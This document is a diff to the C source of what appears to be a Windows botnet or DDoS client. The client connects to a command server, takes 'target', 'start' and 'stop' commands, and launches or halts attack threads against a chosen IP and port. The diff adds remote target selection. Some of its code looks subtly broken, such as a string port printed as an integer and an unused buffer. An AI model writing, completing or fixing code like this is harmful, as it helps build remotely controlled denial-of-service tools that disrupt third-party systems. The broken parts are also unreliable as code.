@@ -15,8 +15,8 @@ HANDLE attack_threads [NUM_THREADS];
 
 int main() {
 
-    char cmd_buff[1024];
-    char output_buff[1024]; 
+    char cmd_buf[1024];
+    char cmd_buf_copy[1024];
 
     // server socket details and setup
     SOCKET server_socket;
@@ -36,11 +36,18 @@ int main() {
     connectSocket(&serv_addr, server_socket, server_ip);
 
     while (1) {
-        memset(cmd_buff, 0, 1024);
-        memset(output_buff, 0, 1024);
-        receiveCommand(server_socket, cmd_buff);
+        memset(cmd_buf, 0, 1024);
+        receiveCommand(server_socket, cmd_buf);
+        char** cmd_args = split(cmd_buf, ' ');
+        char* cmd_arg1 = cmd_args[0];
 
-        if (strcmp(cmd_buff, "start") == 0){
+        if (strcmp(cmd_arg1, "target") == 0){
+            char** target = split(cmd_args[1], ":");
+            target_addr.ip = target[0];
+            target_addr.port = target[1];
+            printf("Target has been set to %s:%i", target_addr.ip, target_addr.port);
+        }
+        else if (strcmp(cmd_arg1, "start") == 0){
             printf("Executing attack...\n");
             running = 1;
             for (int i=0; i<NUM_THREADS; i++){
@@ -50,7 +57,7 @@ int main() {
                     printf("error creating thread \n");
                 }
             }
-        } else if (strcmp(cmd_buff, "stop") == 0){
+        } else if (strcmp(cmd_arg1, "stop") == 0){
             running = 0;
             printf("Stopping attack...\n");
             WaitForMultipleObjects(NUM_THREADS, attack_threads, TRUE, 10000);
